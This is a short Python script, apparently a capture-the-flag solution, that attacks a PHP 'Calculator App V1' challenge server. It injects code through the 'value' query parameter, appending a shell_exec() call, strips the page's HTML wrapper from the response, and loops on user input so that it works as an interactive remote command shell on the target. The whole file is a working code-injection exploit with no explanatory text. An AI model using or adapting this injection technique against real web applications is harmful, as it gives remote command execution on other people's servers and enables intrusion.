import requests
URL = 'http://challs.sieberrsec.tech:4587/calcv1.php'

before = """
<html>
<head>
  <link rel="stylesheet" href="styles.css">
</head>

<h1> 
Calculator App V1!
</h1>
<h3>Your calculated answer is:"""
after = """</h3>
</html>"""


def getOutput(cmd):
    data = {"value": "0; $sum = shell_exec('"+cmd+"');"}
    response = requests.get(URL, params=data) #headers=headers)
    cmd_output = response.text[len(before):-len(after)]
    if len(cmd_output) < 5: return response.text
    else: return cmd_output
    

while True:
    print(getOutput(input('> ')))

